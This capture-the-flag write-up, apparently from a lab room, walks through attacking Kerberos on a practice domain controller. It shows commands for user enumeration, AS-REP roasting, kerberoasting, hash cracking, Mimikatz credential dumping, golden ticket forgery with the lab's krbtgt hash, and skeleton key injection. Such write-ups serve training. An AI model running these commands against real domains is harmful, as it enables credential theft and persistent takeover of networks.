# CTF: Attacking Kerberos

**Target:** `CONTROLLER.local` ($target) **IP:** `10.48.144.56`

## Introduction

This writeup documents the exploitation of Kerberos in a Windows Active Directory environment. The attack involves comprehensive enumeration, multiple methods of credential harvesting, and domain-wide persistence.

### Key Skills/Tools

- **Tools:** `nmap`, `kerbrute`, `Rubeus.exe`, `impacket-getuserspns`, `hashcat`, `mimikatz.exe`.
    
- **Skills:** AS-REP Roasting, Kerberoasting (multiple methods), TGT Harvesting, Golden Ticket Forgery, Skeleton Key Injection.
    

---

## Reconnaissance

Initial identification of the Domain Controller and Kerberos services.

**Command:**

Bash

```
😎 amuzed@Kali (~/THM/Attacking_Kerberos)
$ sudo nmap -A -T4 $target
```

- **Port 88:** Kerberos-sec
    
- **Port 389/636:** LDAP/S
    
- **Port 445:** Microsoft-ds (SMB)
    
- **Port 3389:** RDP
    

---

## Enumeration & Initial Access

### 1. User Enumeration (Kerbrute)

Identifying valid domain users from the Kali machine. **Command:**

Bash

```
😎 amuzed@Kali (~/THM/Attacking_Kerberos)
$ kerbrute userenum --dc $target -d CONTROLLER.local users.txt
```

- **Users:** `admin1`, `admin2`, `administrator`, `machine1`, `machine2`, `httpservice`, `sqlservice`, `user1`, `user2`, `user3`.
    

### 2. Initial Foothold

Connecting to the target via SSH using administrative credentials. **Command:**

Bash

```
😎 amuzed@Kali (~/THM/Attacking_Kerberos)
$ ssh administrator@$target
```

---

## Credential Harvesting & Cracking

### 1. AS-REP Roasting (Rubeus)

Checking for accounts that do not require Kerberos pre-authentication. **Command:**

PowerShell

```
C:\Users\Administrator\Downloads>Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

**Cracking with Hashcat:**

Bash

```
😎 amuzed@Kali (~/THM/Attacking_Kerberos)
$ hashcat -m 18200 asrep_hashes.txt passwordlist.txt
```

### 2. TGT Harvesting (Rubeus)

Monitoring for active tickets in memory. **Command:**

PowerShell

```
C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30
```

### 3. Password Brute Forcing (Rubeus)

**Command:**

PowerShell

```
C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket
```

### 4. Kerberoasting (Rubeus)

**Command:**

PowerShell

```
C:\Users\Administrator\Downloads>Rubeus.exe kerberoast
```

### 5. Kerberoasting (Impacket)

Executing the same attack using the Impacket suite from the Kali box. **Command:**

Bash

```
😎 amuzed@Kali (~/THM/Attacking_Kerberos)
$ impacket-getuserspns controller.local/User3:[PASSWORD] -dc-ip $target -request
```

**Cracking the TGS Hash:**

Bash

```
😎 amuzed@Kali (~/THM/Attacking_Kerberos)
$ hashcat -m 13100 tgs_hashes.txt passwordlist.txt
```

---

## Privilege Escalation & Persistence

### 1. Credential Dumping (Mimikatz)

Extracting the NTLM hashes for domain accounts. **Command:**

PowerShell

```
mimikatz # lsadump::lsa /patch
```

- **krbtgt NTLM:** `72cd714611b64cd4d5550cd2759db3f6`
    
- **Domain SID:** `S-1-5-21-432953485-3795405108-1502158860`
    

### 2. Golden Ticket Forgery

**Command:**

PowerShell

```
mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
```

### 3. Skeleton Key Injection

Applying a master password to the LSASS process. **Commands:**

PowerShell

```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

### 4. Verification

Testing the Skeleton Key persistence by mapping the administrative share with the password `mimikatz`. **Command:**

PowerShell

```
C:\> net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```
